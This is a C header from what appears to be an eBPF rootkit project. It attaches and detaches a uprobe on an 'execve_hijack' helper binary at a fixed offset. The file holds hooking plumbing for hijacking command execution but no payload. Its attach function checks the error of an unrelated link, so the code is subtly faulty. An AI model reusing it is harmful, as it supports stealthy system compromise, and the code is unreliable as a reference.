#ifndef __MOD_INJECTION_H
#define __MOD_INJECTION_H

#include <linux/bpf.h>
#include <bpf/bpf.h>
#include <bpf/libbpf.h>
#include "kit.skel.h"
#include "common.h"

//Connections
int attach_uprobe_execute_command(struct kit_bpf *skel){
    skel->links.uprobe_execute_command = bpf_program__attach_uprobe(skel->progs.uprobe_execute_command, false, -1, "/home/osboxes/TFG/src/helpers/execve_hijack", 4992);
	printf("SET\n");
    return libbpf_get_error(skel->links.tp_sys_enter_execve);
}

int attach_injection_all(struct kit_bpf *skel){
    return attach_uprobe_execute_command(skel);
}


int detach_uprobe_execute_command(struct kit_bpf *skel){
    int err = detach_link_generic(skel->links.uprobe_execute_command);
    if(err<0){
        fprintf(stderr, "Failed to detach fs link\n");
        return -1;
    }
    return 0;
}

int detach_injection_all(struct kit_bpf *skel){
    return detach_uprobe_execute_command(skel);
}

#endif